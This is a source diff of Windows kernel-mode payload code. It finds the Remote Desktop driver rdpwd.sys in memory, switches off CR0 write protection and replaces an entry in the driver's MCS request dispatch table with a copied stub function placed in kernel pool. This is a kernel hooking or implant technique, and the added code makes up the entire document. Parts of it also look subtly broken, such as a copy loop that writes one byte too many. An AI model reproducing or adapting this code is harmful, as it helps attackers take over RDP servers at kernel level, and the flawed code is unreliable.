@@ -24,7 +24,9 @@
  * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 #include <windows.h>
+#include <winternl.h>
 #include <intrin.h>
+#include <ntstatus.h>
 #include "pe_util.h"
 #include "hs_util.h"
 #include "winapi.h"
@@ -34,7 +36,7 @@
 #define RV2OFF(Base, Rva)(((ULONG_PTR)Base) + Rva) 
 #define NT_HDR(x) (PIMAGE_NT_HEADERS)\
 (RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))
-
+#define INDEX_MCS_OPEN_REQUEST 39
 
 static inline 
 __attribute__((always_inline))
@@ -50,6 +52,19 @@ VOID EnableWriteProtection()
 {
 	__writecr0(__readcr0() | (1 << 16));
 	__asm__ __volatile__ ( "sti\n" );
+};
+
+static inline
+__attribute__((always_inline))
+VOID Memcpy_Inline(PVOID Dst, PVOID Src, SIZE_T Length)
+{
+	LPVOID D = Dst;
+	LPVOID S = Src;
+	SIZE_T L = Length;
+
+	do {
+		*(BYTE *)D++ = *(BYTE *)S++;
+	} while ( L-- != 0 ) ;
 };
 
 INT WindowsEntrypoint()
@@ -71,7 +86,7 @@ INT WindowsEntrypoint()
     SecEnd = (LPVOID)(PTR(SecEnd) + SecLen);
     ReqTbl = GetPeSect(Drvs.RdpwdBase, HASH_RDATA, NULL);
 
-    for ( ; ; ReqTbl++ ) {
+    for ( ;; ) {
       if ( (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[0])) &&
 	   (PTR(ReqTbl[0])      < PTR(SecEnd))    &&
 	   (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[1])) &&
@@ -80,9 +95,25 @@ INT WindowsEntrypoint()
 	   (PTR(ReqTbl[4])     == PTR(ReqTbl[5])) &&
 	   (PTR(ReqTbl[6])     == PTR(NULL)) )
       {
-	      break;
+	      goto FoundTableEntrypoint;
       };
+      ReqTbl++;
     };
+
+    NTSTATUS McsDispatchHook()
+    { return STATUS_SUCCESS; };
+    VOID McsDispatchHook_End() { };
+
+FoundTableEntrypoint:
+
+    Func.ExAllocatePool = GetPeFunc(Drvs.NtosKrnlBase, HASH_EXALLOCATEPOOL);
+    SIZE_T LengthOfFunction = PTR(&McsDispatchHook_End) - PTR(&McsDispatchHook);
+    LPVOID FunctionPoolPtr  = Func.ExAllocatePool(0, LengthOfFunction);
+
+    Memcpy_Inline(FunctionPoolPtr, &McsDispatchHook, LengthOfFunction);
+    DisableWriteProtection();
+    ReqTbl[INDEX_MCS_OPEN_REQUEST] = (LPVOID)FunctionPoolPtr;
+    EnableWriteProtection();
   };
 
   return 0;
